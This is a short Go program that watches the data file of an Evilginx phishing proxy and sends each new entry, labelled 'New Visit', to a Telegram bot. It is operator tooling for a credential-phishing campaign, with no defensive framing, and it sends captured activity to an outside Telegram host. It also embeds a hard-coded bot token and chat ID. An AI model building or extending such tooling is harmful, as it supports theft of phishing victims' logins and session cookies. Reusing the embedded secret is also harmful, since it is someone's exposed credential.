package main

import (
    "bufio"
    "fmt"
    "log"
    "net/http"
    "net/url"
    "os"
    "time"
)

func sendTelegram(botToken, chatID, message string) {
    apiURL := "https://api.telegram.org/bot" + botToken + "/sendMessage"

    data := url.Values{}
    data.Set("chat_id", chatID)
    data.Set("text", message)

    _, err := http.PostForm(apiURL, data)
    if err != nil {
        log.Printf("Failed to send Telegram message: %v\n", err)
    }
}

// Read last line of the file
func readLastLine(path string) (string, error) {
    file, err := os.Open(path)
    if err != nil {
        return "", err
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    var last string

    for scanner.Scan() {
        last = scanner.Text()
    }

    return last, scanner.Err()
}

func main() {
    // Your Telegram bot info
    botToken := "8471535230:AAFtKZ2V4zkcCW6yTHs1rGrdb9waaiDQzIQ"
    chatID := "7600034451"

    dbPath := "/root/.evilginx/data.db" // TEXT FILE, NOT REAL DB

    var lastTimestamp string

    fmt.Println("🔥 Evilginx Monitor Started")
    fmt.Println("Watching DB:", dbPath)
    fmt.Println("----------------------------------------")

    // Initialize last known timestamp from file
    lastTimestamp, _ = readLastLine(dbPath)

    for {
        current, err := readLastLine(dbPath)
        if err != nil {
            log.Printf("Read error: %v\n", err)
            time.Sleep(3 * time.Second)
            continue
        }

        if current != "" && current != lastTimestamp {
            msg := fmt.Sprintf("New Visit → Timestamp: %s", current)

            // Terminal display
            fmt.Println(msg)

            // Telegram message
            sendTelegram(botToken, chatID, msg)

            lastTimestamp = current
        }

        time.Sleep(3 * time.Second)
    }
}